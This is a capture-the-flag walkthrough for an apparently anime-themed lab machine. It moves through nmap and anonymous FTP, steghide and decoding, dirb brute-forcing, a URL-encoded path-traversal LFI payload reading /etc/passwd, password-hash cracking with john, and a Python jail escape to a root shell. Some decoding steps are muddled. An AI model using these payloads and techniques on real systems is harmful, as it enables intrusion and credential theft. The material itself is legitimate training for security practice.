#Network Scanning

````
We shall start with an nmap scan: nmap -sC -sV <Target IP>

From the scan, 3 ports are open, 21,22 and 80 running FTP,SSH and HTTP services respectively.

The OS being run appears to be Ubuntu.

FTP service allows for Anonymous login, and there's a directory called need_Help?

Further, navigating to the webpage, it describes the story of one Ken Kaneki. At the end of the story there is a Link.

Clicking the link takes us to a different site, where upon viewing the source page, we see some notes giving us a hint to log in anonymously into the FTP. We already know that anon Login is allowd on the FTP from our nmap scan.

Logging in to the FTP service we have the need_Help Dir.

We also grab the files in the various directories to our local system for closer look.

ftp <Target IP>
anonymous
cd need_Help
get Aogiri_tree.txt
cd Talk_with_me
ls
get need_to_talk
get rize_and_kaneni.jpg

Reading the Aogiri_tree.txt file, we take note of two additional words, Kagune and Aogiri.


````

#Some Stego - Task 3.

````
We also grabbed a jpg file from the FTP Server.
No important results found when looked in the IMAGE VIEWER AND EXIF TOOL.

Thus, this leads us to the thought that it could be a compressed file, we shall now enlist the services of another cool tool, steghide to extract it.
A password is needed to extract the files inside this image.

As a next step, we upgrade the permissions of the need_to talk file and execute on our local system.

chmod 777 need_to_talk.
./need_to_talk

Strings command extracts the human-readable words from the machine code.

strings need_to_talk.

Task

jasonroom.html
kamishiro
````

#Task 4.

````
Run the executable again, this time use the passphrase from above; kamishiro

steghide extract -sf rize_and_kaneki.jpg
use the passphrase: You_found_1t

cat yougotme.txt

Morse code. we can use morsedecoder.com to decipher.

We get a Hex string 5A4446794D324D334D484A3558324E6C626E526C63673D3D

using cyberchef, we can convert this to bas64

 What the message mean did you understand it ? what it says? 

The decypted message: d1r3c70ry_center


Navigave to http://10.10.116.174/d1r3c70ry_center
we are greated by  Scan me scan me scan all my ideas aaaaahhhhhhhh 

We shall do a directory bruteforce using dirb.

dirb http://10.10.110.115/d1r3c70ry_center/

of interest is the claim directory, lets navigate to it.

we land on Welcome Kankei-Ken message.

?view=flower.gif. This view parameter makes us try LFI.

http://10.10.110.115/d1r3c70ry_center/claim/index.php?view=../../../../etc/passwd

This doesn't work. We need to encode tha backslashes.

http://10.10.110.115/d1r3c70ry_center/claim/index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd


We get a username.



what is rize username ?
kamishiro

The hashed passwd: $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0

you could try cracking this using crackstation or save it to a file then use john to crack it.

john --wordlist=/usr/share/wordlists/rockyou.txt <filename>

we get the passwd.



what is rize password ?
password123
````

#Task 5

````
Login to the target machine as user kamishiro with the password.

ssh kamishiro@10.10.115.10

ls

cat user.txt and submit the flag

Some Privest to get the root flag.

sudo -l

sudo /usr/bin/python3 /home/kamishiro/jail.py

__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')

cd /root

cat root.txt

submit the root.txt

And that's it.

````